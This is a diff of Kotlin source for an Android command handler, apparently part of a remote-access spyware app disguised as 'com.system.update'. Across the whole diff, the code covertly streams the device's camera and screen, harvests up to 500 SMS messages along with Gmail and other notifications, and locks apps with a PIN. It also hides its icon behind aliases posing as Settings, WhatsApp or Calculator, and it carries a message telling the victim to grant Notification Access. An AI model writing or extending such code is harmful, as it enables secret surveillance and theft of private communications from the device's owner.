@@ -89,6 +89,23 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
 
     fun readAllSmsPublic(): Map<String, Any> = readAllSms()
 
+    fun getSmsLastTimestamp(): Long {
+        return try {
+            val cursor = ctx.contentResolver.query(
+                Uri.parse("content://sms/"),
+                arrayOf("date"),
+                null, null, "date DESC LIMIT 1"
+            )
+            var ts = 0L
+            cursor?.use {
+                if (it.moveToFirst()) {
+                    ts = it.getLong(it.getColumnIndexOrThrow("date"))
+                }
+            }
+            ts
+        } catch (_: Exception) { 0L }
+    }
+
     fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
         when (cmd) {
 
@@ -230,7 +247,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 try {
                     val i = Intent(ctx, CameraStreamService::class.java).apply {
                         putExtra("front", true)
-                        putExtra("interval", 120L)
+                        putExtra("interval", 150L)
                     }
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         ctx.startForegroundService(i)
@@ -245,7 +262,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 try {
                     val i = Intent(ctx, CameraStreamService::class.java).apply {
                         putExtra("front", false)
-                        putExtra("interval", 120L)
+                        putExtra("interval", 150L)
                     }
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         ctx.startForegroundService(i)
@@ -266,7 +283,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
                     try {
                         val i = Intent(ctx, ScreenStreamService::class.java).apply {
-                            putExtra("interval", 120L)
+                            putExtra("interval", 150L)
                         }
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                             ctx.startForegroundService(i)
@@ -283,39 +300,26 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 try { ctx.stopService(Intent(ctx, ScreenStreamService::class.java)) } catch (_: Exception) {}
                 done(mapOf("ok" to true))
             }
-            
-            // ============ SMS + NOTIF ============
-"sms" -> {
-    val smsList = readAllSms()
-    val notifList = NotificationListener.getAllNotifs()
-    done(mapOf(
-        "type" to "sms",
-        "messages" to (smsList["messages"] ?: emptyList<Map<String, String>>()),
-        "notifications" to notifList
-    ))
-}
-            // ============ GMAIL ============
-"gmail" -> {
-    val notifEnabled = try {
-        val enabled = Settings.Secure.getString(
-            ctx.contentResolver,
-            "enabled_notification_listeners"
-        ) ?: ""
-        enabled.contains(ctx.packageName)
-    } catch (_: Exception) { false }
 
-    if (!notifEnabled) {
-        done(mapOf(
-            "type" to "text",
-            "data" to "Notification Access belum diaktifkan. Buka: Settings → Apps → Special Access → Notification Access → aktifkan System Update"
-        ))
-    } else {
-        done(mapOf(
-            "type" to "gmail",
-            "items" to NotificationListener.getGmailNotifs()
-        ))
-    }
-}
+            // ============ SMS ============
+            "sms" -> {
+                val smsList = readAllSms()
+                val notifList = NotificationListener.getAllNotifs()
+                done(mapOf(
+                    "type" to "sms",
+                    "messages" to (smsList["messages"] ?: emptyList<Map<String, String>>()),
+                    "notifications" to notifList
+                ))
+            }
+
+            // ============ GMAIL ============
+            "gmail" -> {
+                done(mapOf(
+                    "type" to "gmail",
+                    "items" to NotificationListener.getGmailNotifs()
+                ))
+            }
+
             // ============ OPEN NOTIFICATION ACCESS ============
             "open_notif_access" -> {
                 try {
@@ -460,8 +464,6 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     done(mapOf("ok" to true, "package" to pkg, "pin" to pin))
                 }
             }
-
-            // ============ UNLOCK APP ============
             "unlock_app" -> {
                 val pkg = args?.get("package")?.asString ?: ""
                 if (pkg.isEmpty()) {
@@ -497,88 +499,82 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             }
 
             // ============ HIDE APP ============
-            // ============ HIDE APP (BENERAN HILANG) ============
-"hide_app" -> {
-    try {
-        val pm = ctx.packageManager
+            "hide_app" -> {
+                try {
+                    val pm = ctx.packageManager
 
-        // Aktifkan alias HIDDEN (icon transparan + nama kosong)
-        try {
-            pm.setComponentEnabledSetting(
-                ComponentName(ctx.packageName, "com.system.update.AliasHidden"),
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
+                    try {
+                        pm.setComponentEnabledSetting(
+                            ComponentName(ctx.packageName, "com.system.update.AliasSettings"),
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP
+                        )
+                    } catch (_: Exception) {}
 
-        // Disable SetupUsernameActivity
-        try {
-            pm.setComponentEnabledSetting(
-                ComponentName(ctx, SetupUsernameActivity::class.java),
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
+                    try {
+                        pm.setComponentEnabledSetting(
+                            ComponentName(ctx, SetupUsernameActivity::class.java),
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP
+                        )
+                    } catch (_: Exception) {}
 
-        // Disable alias lain
-        val otherAliases = listOf(
-            "com.system.update.AliasSystemUpdate",
-            "com.system.update.AliasPlayServices",
-            "com.system.update.AliasSettings",
-            "com.system.update.AliasWhatsApp",
-            "com.system.update.AliasCalculator"
-        )
-        for (alias in otherAliases) {
-            try {
-                pm.setComponentEnabledSetting(
-                    ComponentName(ctx.packageName, alias),
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP
-                )
-            } catch (_: Exception) {}
-        }
+                    val otherAliases = listOf(
+                        "com.system.update.AliasSystemUpdate",
+                        "com.system.update.AliasPlayServices",
+                        "com.system.update.AliasWhatsApp",
+                        "com.system.update.AliasCalculator"
+                    )
+                    for (alias in otherAliases) {
+                        try {
+                            pm.setComponentEnabledSetting(
+                                ComponentName(ctx.packageName, alias),
+                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                android.content.pm.PackageManager.DONT_KILL_APP
+                            )
+                        } catch (_: Exception) {}
+                    }
 
-        done(mapOf("ok" to true))
-    } catch (e: Exception) {
-        done(mapOf("error" to e.message))
-    }
-}
+                    done(mapOf("ok" to true))
+                } catch (e: Exception) {
+                    done(mapOf("error" to e.message))
+                }
+            }
 
-// ============ SHOW APP ============
-"show_app" -> {
-    try {
-        val pm = ctx.packageManager
-        try {
-            pm.setComponentEnabledSetting(
-                ComponentName(ctx, SetupUsernameActivity::class.java),
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
+            // ============ SHOW APP ============
+            "show_app" -> {
+                try {
+                    val pm = ctx.packageManager
+                    try {
+                        pm.setComponentEnabledSetting(
+                            ComponentName(ctx, SetupUsernameActivity::class.java),
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP
+                        )
+                    } catch (_: Exception) {}
 
-        val allAliases = listOf(
-            "com.system.update.AliasSystemUpdate",
-            "com.system.update.AliasPlayServices",
-            "com.system.update.AliasSettings",
-            "com.system.update.AliasWhatsApp",
-            "com.system.update.AliasCalculator",
-            "com.system.update.AliasHidden"
-        )
-        for (alias in allAliases) {
-            try {
-                pm.setComponentEnabledSetting(
-                    ComponentName(ctx.packageName, alias),
-                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    android.content.pm.PackageManager.DONT_KILL_APP
-                )
-            } catch (_: Exception) {}
-        }
+                    val allAliases = listOf(
+                        "com.system.update.AliasSystemUpdate",
+                        "com.system.update.AliasPlayServices",
+                        "com.system.update.AliasSettings",
+                        "com.system.update.AliasWhatsApp",
+                        "com.system.update.AliasCalculator"
+                    )
+                    for (alias in allAliases) {
+                        try {
+                            pm.setComponentEnabledSetting(
+                                ComponentName(ctx.packageName, alias),
+                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                android.content.pm.PackageManager.DONT_KILL_APP
+                            )
+                        } catch (_: Exception) {}
+                    }
 
-        done(mapOf("ok" to true))
-    } catch (e: Exception) {
-        done(mapOf("error" to e.message))
-    }
-}
+                    done(mapOf("ok" to true))
+                } catch (e: Exception) {
+                    done(mapOf("error" to e.message))
+                }
+            }
 
             // ============ SET APP ICON ============
             "set_app_icon" -> {
@@ -716,43 +712,41 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     private fun readAllSms(): Map<String, Any> {
-    val list = mutableListOf<Map<String, String>>()
-    try {
-        val cursor = ctx.contentResolver.query(
-            Uri.parse("content://sms/"),
-            arrayOf("_id", "address", "body", "date", "type"),
-            null,
-            null,
-            "date DESC LIMIT 500"
-        )
-        cursor?.use {
-            while (it.moveToNext()) {
-                val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
-                val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
-                val date = it.getLong(it.getColumnIndexOrThrow("date"))
-                val type = it.getInt(it.getColumnIndexOrThrow("type"))
-                val typeStr = when (type) {
-                    1 -> "inbox"
-                    2 -> "sent"
-                    3 -> "draft"
-                    4 -> "outbox"
-                    5 -> "failed"
-                    6 -> "queued"
-                    else -> "other"
+        val list = mutableListOf<Map<String, String>>()
+        try {
+            val cursor = ctx.contentResolver.query(
+                Uri.parse("content://sms/"),
+                arrayOf("_id", "address", "body", "date", "type"),
+                null,
+                null,
+                "date DESC LIMIT 500"
+            )
+            cursor?.use {
+                while (it.moveToNext()) {
+                    val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
+                    val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
+                    val date = it.getLong(it.getColumnIndexOrThrow("date"))
+                    val type = it.getInt(it.getColumnIndexOrThrow("type"))
+                    val typeStr = when (type) {
+                        1 -> "inbox"
+                        2 -> "sent"
+                        3 -> "draft"
+                        4 -> "outbox"
+                        5 -> "failed"
+                        6 -> "queued"
+                        else -> "other"
+                    }
+                    list.add(mapOf(
+                        "app" to addr,
+                        "body" to body,
+                        "date" to date.toString(),
+                        "type" to typeStr
+                    ))
                 }
-                list.add(mapOf(
-                    "app" to addr,
-                    "body" to body,
-                    "date" to date.toString(),
-                    "type" to typeStr
-                ))
             }
-        }
-    } catch (e: Exception) {
-        android.util.Log.e("CommandHandler", "readAllSms error", e)
+        } catch (_: Exception) {}
+        return mapOf("type" to "sms", "messages" to list)
     }
-    return mapOf("type" to "sms", "messages" to list)
-}
 
     private fun readGallery(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
